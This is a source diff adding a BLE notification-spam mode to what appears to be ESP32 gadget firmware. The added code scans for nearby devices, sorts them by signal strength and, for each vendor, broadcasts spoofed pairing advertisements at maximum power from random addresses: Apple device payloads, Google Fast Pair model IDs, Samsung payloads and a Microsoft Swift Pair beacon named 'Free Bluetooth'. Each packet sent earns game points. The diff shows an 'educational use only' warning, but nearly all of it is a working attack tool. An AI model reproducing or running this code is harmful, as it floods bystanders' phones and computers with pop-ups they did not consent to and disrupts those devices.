@@ -10,6 +10,7 @@
 #include "../piglet/avatar.h"
 #include "../audio/sfx.h"
 #include "../hal/hal_input.h"
+#include "../hal/hal_display.h"
 #include <NimBLEDevice.h>
 #include <WiFi.h>
 #include <algorithm>
@@ -498,3 +499,487 @@ void PiggyBluesMode::init() {
     
     // Reset deferred target state
     pendingTargetAdd = false;
+    pendingTargetBusy = false;
+    
+    // Reset timing state
+    lastMoodUpdateTime = 0;
+    advertisingStartTime = 0;
+
+    // Pre-allocate advertisement buffer to avoid hot-path allocations
+    primeAdvCache();
+}
+
+bool PiggyBluesMode::showWarningDialog() {
+    // Warning dialog styled like showToast - pink box on black background
+    // Slightly larger to fit warning text
+    DisplayCanvas& canvas = Display::getMain();
+    
+    // Set bottom bar overlay for duration of dialog
+    Display::setBottomOverlay("NO LOLLYGAGGIN'");
+    
+    int boxW = DIALOG_WIDTH;
+    int boxH = DIALOG_HEIGHT;
+    int boxX = (DISPLAY_W - boxW) / 2;
+    int boxY = (MAIN_H - boxH) / 2;
+    
+    uint32_t startTime = millis();
+    uint32_t timeout = DIALOG_TIMEOUT_MS;
+    
+    while ((millis() - startTime) < timeout) {
+        hal_input_update();
+        hal_input_update();
+        
+        uint32_t remaining = (timeout - (millis() - startTime)) / 1000 + 1;
+        
+        // Clear and redraw
+        canvas.fillSprite(COLOR_BG);
+        
+        // Black border then pink fill
+        canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, COLOR_BG);
+        canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, COLOR_FG);
+        
+        // Black text on pink background
+        canvas.setTextColor(COLOR_BG, COLOR_FG);
+        canvas.setTextDatum(top_center);
+        canvas.setTextSize(1);
+        canvas.setFont(NULL);
+        
+        int centerX = DISPLAY_W / 2;
+        canvas.drawString("!! WARNING !!", centerX, boxY + 8);
+        canvas.drawString("BLE NOTIFICATION SPAM", centerX, boxY + 22);
+        canvas.drawString("EDUCATIONAL USE ONLY!", centerX, boxY + 36);
+        
+        char buf[24];
+        snprintf(buf, sizeof(buf), "[Y] YES  [N] NO (%lu)", remaining);
+        canvas.drawString(buf, centerX, boxY + 54);
+        
+        Display::pushAll();
+        
+        if (hal_input_isChange()) {
+            if (hal_input_wasPressed(KEY_ESC)) {
+                Display::clearBottomOverlay();
+                return false;
+            }
+            if (hal_input_wasPressed('y') || hal_input_wasPressed('Y')) {
+                Display::clearBottomOverlay();
+                return true;
+            }
+        }
+        
+        delay(50);
+    }
+    
+    // Timeout = abort
+    Display::clearBottomOverlay();
+    return false;
+}
+
+void PiggyBluesMode::start() {
+    if (running) return;
+    
+    // Reset state for new session
+    init();
+    Mood::resetBLESniffState();  // Reset first-target sniff for new session
+    
+    // Show warning dialog
+    if (!showWarningDialog()) {
+        return;
+    }
+    
+    confirmed = true;
+    
+    // Stop NetworkRecon before disabling WiFi (BLE needs exclusive radio)
+    NetworkRecon::stop();
+    
+    // Disable WiFi to improve BLE performance (shared antenna)
+    WiFi.mode(WIFI_OFF);
+    delay(BLE_OP_DELAY_MS);
+    
+    // Initialize NimBLE only if not already initialized
+    if (!NimBLEDevice::isInitialized()) {
+        NimBLEDevice::init("");
+    }
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Max power for range
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);  // Use random address
+    
+    pAdvertising = NimBLEDevice::getAdvertising();
+    if (!pAdvertising) {
+        WiFi.mode(WIFI_STA);  // Re-enable WiFi on failure
+        return;
+    }
+    pAdvertising->setMinInterval(BLE_ADV_MIN_INTERVAL);  // 20ms
+    pAdvertising->setMaxInterval(BLE_ADV_MAX_INTERVAL);  // 40ms
+    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);  // Non-connectable
+    
+    running = true;
+    lastBurstTime = millis();
+    
+    // Start continuous background scanning
+    startContinuousScan();
+    
+    // Fast moving binary grass for chaos mode
+    Avatar::setGrassSpeed(50);  // Fast chaos mode
+    Avatar::setGrassMoving(true);
+}
+
+void PiggyBluesMode::stop() {
+    if (!running) return;
+    
+    // Stop continuous scan first
+    stopContinuousScan();
+    
+    // Clear scan results
+    NimBLEScan* pScan = NimBLEDevice::getScan();
+    if (pScan) {
+        pScan->clearResults();
+    }
+    
+    // Stop advertising
+    if (pAdvertising && pAdvertising->isAdvertising()) {
+        pAdvertising->stop();
+        delay(BLE_OP_DELAY_MS);
+    }
+    // Keep pAdvertising pointer - we'll reuse it on restart
+    
+    // Give BLE stack time to settle
+    delay(BLE_STACK_SETTLE_MS);
+    
+    // DON'T call deinit - ESP32-S3 has issues reinitializing BLE after deinit
+    // Just keep BLE initialized but idle
+    
+    running = false;
+    confirmed = false;
+    targets.clear();
+    targets.shrink_to_fit();  // FIX: Release vector capacity to recover heap
+    activeCount = 0;
+    setAdvertisingNow(false);
+    
+    Avatar::setGrassMoving(false);
+    Avatar::resetGrassPattern();
+    
+    bool doReboot = (random(0, 100) < REBOOT_CHANCE_PERCENT);
+    if (doReboot) {
+        // Death screen - take over display
+        g_Display.fillScreen(TFT_BLACK);
+        g_Display.setTextColor(TFT_RED);
+        g_Display.setTextDatum(middle_center);
+        g_Display.setTextSize(3);
+        g_Display.drawString("YOU DIED", g_Display.width() / 2, g_Display.height() / 2);
+        
+        // Play death sound and wait 5 seconds (pumping audio engine)
+        SFX::play(SFX::YOU_DIED);
+        uint32_t start = millis();
+        while (millis() - start < 5000) {
+            SFX::update();
+            delay(10);
+        }
+        
+        ESP.restart();
+        return;
+    }
+    
+    // No reboot this time - reward XP and restore network recon
+    Display::showToast("BLUES SLAYED.\nJUST ROULETTE.\n+15 XP");
+    XP::addRouletteWin();
+    XP::addXPSilent(NO_REBOOT_XP_BONUS);
+
+    // Restore WiFi driver after BLE tore it down in start()
+    WiFi.mode(WIFI_STA);
+    delay(HeapPolicy::kWiFiModeDelayMs);
+
+    // Restart background network reconnaissance (WiFi promiscuous mode)
+    NetworkRecon::start();
+}
+
+void PiggyBluesMode::update() {
+    if (!running) return;
+    
+    uint32_t now = millis();
+    
+    // Process any targets discovered by scan callback (deferred pattern)
+    processTargets();
+    
+    // Age out stale targets (not seen in 10s = out of range)
+    ageOutStaleTargets();
+    
+    // Refresh active target selection (sorted by RSSI)
+    selectActiveTargets();
+    
+    // Non-blocking advertising state machine
+    bool advNow = getAdvertisingNow();
+    if (advNow) {
+        // We are in an advertising burst. Check if it's time to stop.
+        if (now - advertisingStartTime >= cfgAdvDuration) {
+            if (pAdvertising && pAdvertising->isAdvertising()) {
+                pAdvertising->stop();
+            }
+            setAdvertisingNow(false);
+        }
+    } else {
+        // We are not advertising. Check if it's time to start a new burst.
+        if (now - lastBurstTime >= burstInterval) {
+            setAdvertisingNow(true);
+            advertisingStartTime = now;
+            lastBurstTime = now; // Reset timer for the next burst interval.
+            
+            // This function will now only START the advertisement, not block.
+            sendRandomPayload();
+        }
+    }
+    
+    // Update mood occasionally with target info
+    if (now - lastMoodUpdateTime > MOOD_UPDATE_INTERVAL_MS) {
+        const char* vendorStr = nullptr;
+        if (lastVendorUsed != BLEVendor::UNKNOWN) {
+            switch (lastVendorUsed) {
+                case BLEVendor::APPLE: vendorStr = "Apple"; break;
+                case BLEVendor::ANDROID: vendorStr = "Android"; break;
+                case BLEVendor::SAMSUNG: vendorStr = "Samsung"; break;
+                case BLEVendor::WINDOWS: vendorStr = "Windows"; break;
+                default: break;
+            }
+        }
+        uint8_t totalFound = (targets.size() > MAX_TARGETS_FOR_MOOD) ? MAX_TARGETS_FOR_MOOD : (uint8_t)targets.size();
+        Mood::onPiggyBluesUpdate(vendorStr, lastRssiUsed, activeCount, totalFound);
+        lastMoodUpdateTime = now;
+    }
+}
+
+// Old scanForDevices() and selectTargets() removed - replaced by continuous async scanning
+
+BLEVendor PiggyBluesMode::identifyVendor(const uint8_t* mfgData, size_t len) {
+    if (!mfgData || len < 2) return BLEVendor::UNKNOWN;
+    
+    // Company ID is first 2 bytes (little endian)
+    uint16_t companyId = mfgData[0] | (mfgData[1] << 8);
+    
+    switch (companyId) {
+        case 0x004C:  // Apple
+            return BLEVendor::APPLE;
+        case 0x00E0:  // Google
+        case 0x02E0:  // Google (alternate)
+            return BLEVendor::ANDROID;
+        case 0x0075:  // Samsung
+            return BLEVendor::SAMSUNG;
+        case 0x0006:  // Microsoft
+            return BLEVendor::WINDOWS;
+        default:
+            return BLEVendor::UNKNOWN;
+    }
+}
+
+void PiggyBluesMode::sendAppleJuice() {
+    if (!pAdvertising) return;
+    
+    // Stop any current advertising first
+    if (pAdvertising->isAdvertising()) {
+        pAdvertising->stop();
+    }
+    
+    // Randomly choose between long (audio) and short (AppleTV) devices
+    // Short devices work at longer range
+    bool useLongDevice = (random(0, 2) == 0);
+    
+    const uint8_t* payload;
+    size_t len;
+    
+    if (useLongDevice) {
+        int idx = random(0, APPLE_LONG_COUNT);
+        payload = APPLE_DEVICES_LONG[idx];
+    } else {
+        int idx = random(0, APPLE_SHORT_COUNT);
+        payload = APPLE_DEVICES_SHORT[idx];
+    }
+    len = payload[0] + 1;  // First byte is length, +1 for the length byte itself
+    
+    // Use non-connectable advertising for BLE spam
+    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    
+    // Use raw payload directly in advertisement data
+    advDataCache.clearData();
+    if (!advDataCache.addData(payload, len)) {
+        return;
+    }
+    if (!pAdvertising->setAdvertisementData(advDataCache)) {
+        return;
+    }
+    
+    // Start advertising
+    if (pAdvertising->start()) {
+        totalPackets++;
+        appleCount++;
+        XP::addXP(XPEvent::BLE_APPLE);  // +3 XP
+    }
+}
+
+void PiggyBluesMode::sendAndroidFastPair() {
+    if (!pAdvertising) return;
+    
+    if (pAdvertising->isAdvertising()) {
+        pAdvertising->stop();
+    }
+    
+    // Random FastPair model
+    uint32_t modelId = FASTPAIR_MODELS[random(0, FASTPAIR_MODEL_COUNT)];
+    
+    // Build FastPair advertisement payload without heap allocations
+    uint8_t payload[14];
+    payload[0] = 0x02;  // Flags length
+    payload[1] = 0x01;  // Flags type
+    payload[2] = 0x06;  // LE General Discoverable + BR/EDR not supported
+    payload[3] = 0x03;  // Service UUID list length
+    payload[4] = 0x03;  // Complete list of 16-bit Service UUIDs
+    payload[5] = 0x2C;  // 0xFE2C (Fast Pair)
+    payload[6] = 0xFE;
+    payload[7] = 0x06;  // Service Data length
+    payload[8] = 0x16;  // Service Data AD type
+    payload[9] = 0x2C;  // 0xFE2C
+    payload[10] = 0xFE;
+    payload[11] = (modelId >> 16) & 0xFF;
+    payload[12] = (modelId >> 8) & 0xFF;
+    payload[13] = modelId & 0xFF;
+
+    advDataCache.clearData();
+    if (!advDataCache.addData(payload, sizeof(payload))) {
+        return;
+    }
+    
+    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    if (!pAdvertising->setAdvertisementData(advDataCache)) {
+        return;
+    }
+    
+    if (pAdvertising->start()) {
+        totalPackets++;
+        androidCount++;
+        XP::addXP(XPEvent::BLE_ANDROID);  // +2 XP
+    }
+}
+
+void PiggyBluesMode::sendSamsungSpam() {
+    if (!pAdvertising) return;
+    
+    if (pAdvertising->isAdvertising()) {
+        pAdvertising->stop();
+    }
+    
+    // Random Samsung payload
+    int idx = random(0, SAMSUNG_PAYLOAD_COUNT);
+    const uint8_t* payload = SAMSUNG_PAYLOADS[idx];
+    size_t len = payload[0] + 1;  // payload[0] is length byte
+    
+    // Use raw payload directly in advertisement data
+    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    advDataCache.clearData();
+    if (!advDataCache.addData(payload, len)) {
+        return;
+    }
+    if (!pAdvertising->setAdvertisementData(advDataCache)) {
+        return;
+    }
+    
+    if (pAdvertising->start()) {
+        totalPackets++;
+        samsungCount++;
+        XP::addXP(XPEvent::BLE_SAMSUNG);  // +2 XP
+    }
+}
+
+void PiggyBluesMode::sendWindowsSwiftPair() {
+    if (!pAdvertising) return;
+    
+    if (pAdvertising->isAdvertising()) {
+        pAdvertising->stop();
+    }
+    
+    // SwiftPair beacon format
+    // Microsoft vendor ID + SwiftPair indicator
+    // NimBLE 2.x: setManufacturerData expects [company_lo, company_hi, data...]
+    uint8_t mfgData[] = {
+        0x06, 0x00,              // Microsoft company ID (little endian)
+        0x03,                    // SwiftPair beacon type
+        0x00,                    // Reserved
+        0x80                     // Display icon (0x80 = generic)
+    };
+    
+    // Build SwiftPair payload without heap allocations
+    static const char kSwiftPairName[] = "Free Bluetooth";
+    constexpr size_t kSwiftPairNameLen = sizeof(kSwiftPairName) - 1;
+    uint8_t payload[31];
+    size_t idx = 0;
+    payload[idx++] = 0x02;  // Flags length
+    payload[idx++] = 0x01;  // Flags type
+    payload[idx++] = 0x06;  // LE General Discoverable + BR/EDR not supported
+    payload[idx++] = static_cast<uint8_t>(sizeof(mfgData) + 1); // Length of mfg data + type
+    payload[idx++] = 0xFF;  // Manufacturer data type
+    memcpy(&payload[idx], mfgData, sizeof(mfgData));
+    idx += sizeof(mfgData);
+    payload[idx++] = static_cast<uint8_t>(kSwiftPairNameLen + 1); // Name length + type
+    payload[idx++] = 0x09;  // Complete local name
+    memcpy(&payload[idx], kSwiftPairName, kSwiftPairNameLen);
+    idx += kSwiftPairNameLen;
+
+    if (idx > sizeof(payload)) {
+        return;
+    }
+
+    advDataCache.clearData();
+    if (!advDataCache.addData(payload, idx)) {
+        return;
+    }
+    
+    pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    if (!pAdvertising->setAdvertisementData(advDataCache)) {
+        return;
+    }
+    
+    if (pAdvertising->start()) {
+        totalPackets++;
+        windowsCount++;
+        XP::addXP(XPEvent::BLE_WINDOWS);  // +2 XP
+    }
+}
+
+void PiggyBluesMode::sendRandomPayload() {
+    // If we have active targets, weight payloads toward detected vendors
+    // Otherwise pure random chaos
+    // NOTE: targets is sorted by RSSI, activeCount = number of "active" targets at front
+    
+    if (activeCount > 0 && targets.size() > 0) {
+        // Pick a random target from the active set (first activeCount entries)
+        uint8_t idx = random(0, activeCount);
+        if (idx < targets.size()) {
+            BLEVendor vendor = targets[idx].vendor;
+            lastVendorUsed = vendor;
+            lastRssiUsed = targets[idx].rssi;
+            
+            switch (vendor) {
+                case BLEVendor::APPLE:
+                    sendAppleJuice();
+                    return;
+                case BLEVendor::ANDROID:
+                    sendAndroidFastPair();
+                    return;
+                case BLEVendor::SAMSUNG:
+                    sendSamsungSpam();
+                    return;
+                case BLEVendor::WINDOWS:
+                    sendWindowsSwiftPair();
+                    return;
+                default:
+                    break;  // Fall through to random
+            }
+        }
+    }
+    
+    // Fallback: random chaos mode (no targets or unknown vendor)
+    lastVendorUsed = BLEVendor::UNKNOWN;
+    lastRssiUsed = 0;
+    int choice = random(0, 4);
+    switch (choice) {
+        case 0: sendAppleJuice(); break;
+        case 1: sendAndroidFastPair(); break;
+        case 2: sendSamsungSpam(); break;
+        case 3: sendWindowsSwiftPair(); break;
+    }
+}
